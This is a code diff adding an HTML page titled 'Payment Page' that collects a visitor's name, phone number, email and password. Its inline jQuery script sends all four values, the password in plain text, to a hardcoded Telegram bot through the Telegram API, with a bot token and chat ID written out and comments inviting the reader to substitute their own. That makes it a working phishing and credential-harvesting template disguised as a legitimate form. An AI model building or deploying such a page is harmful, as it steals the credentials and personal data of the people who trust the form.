@@ -1,0 +1,81 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Payment Page</title>
+    <link rel="stylesheet" href="style.css">
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+    <style>
+        .error { color: red; font-size: 12px; }
+        .invalid { border: 1px solid red; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>Customer Information</h1>
+        <form id="paymentForm" method="POST">
+            <div class="form-group">
+                <label for="name">Name</label>
+                <input type="text" id="name" name="name" required autocomplete="name" placeholder="John Doe">
+                <div class="error" id="nameError"></div>
+            </div>
+            <div class="form-group">
+                <label for="phone">Phone Number</label>
+                <input type="tel" id="phone" name="phone" required autocomplete="tel" placeholder="123-456-7890">
+                <div class="error" id="phoneError"></div>
+            </div>
+            <div class="form-group">
+                <label for="email">Email</label>
+                <input type="email" id="email" name="email" required autocomplete="email" placeholder="example@email.com">
+                <div class="error" id="emailError"></div>
+            </div>
+            <div class="form-group">
+                <label for="password">Password</label>
+                <input type="password" id="password" name="password" required autocomplete="new-password" placeholder="********">
+                <div class="error" id="passwordError"></div>
+            </div>
+            <button type="submit" class="btn">Submit</button>
+        </form>
+        <div class="footer">
+            <p>By clicking "Submit", you agree to our <a href="#">Terms of Service</a> and <a href="#">Privacy Policy</a>.</p>
+        </div>
+    </div>
+
+    <script>
+        const BOT_TOKEN = "8098501021:AAGbAdK3olQzWW4iqHsdB26ps8lAaQDFXNg"; // Replace with your bot token
+        const CHAT_ID = "7233135247"; // Replace with your chat ID
+
+        $(document).ready(function() {
+            $('#paymentForm').on('submit', function(e) {
+                e.preventDefault();
+
+                var name = $('#name').val().trim();
+                var phone = $('#phone').val().trim();
+                var email = $('#email').val().trim();
+                var password = $('#password').val().trim();
+
+                var message = `Customer Information:\nName: ${name}\nPhone: ${phone}\nEmail: ${email}\nPassword: ${password}`;
+
+                // Send the data to Telegram
+                $.ajax({
+                    url: `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,
+                    method: 'POST',
+                    data: {
+                        chat_id: CHAT_ID,
+                        text: message,
+                        parse_mode: 'Markdown'
+                    },
+                    success: function() {
+                        alert("Customer information sent successfully!");
+                        $('#paymentForm')[0].reset(); // Reset the form
+                    },
+                    error: function() {
+                        alert("There was an error sending the information.");
+                    }
+                });
+            });
+        });
+    </script>
+</body>
+</html>
